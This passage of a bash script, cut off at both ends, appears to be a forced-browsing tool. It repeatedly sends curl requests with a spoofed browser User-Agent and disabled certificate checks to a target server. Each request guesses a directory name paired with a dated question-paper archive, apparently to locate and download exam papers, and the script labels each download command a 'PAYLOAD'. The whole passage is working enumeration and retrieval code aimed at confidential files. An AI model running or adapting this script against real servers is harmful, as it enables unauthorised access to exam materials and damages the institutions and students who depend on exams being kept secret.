payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPService/QP19_02_2025%2001_16_01.zip]:"
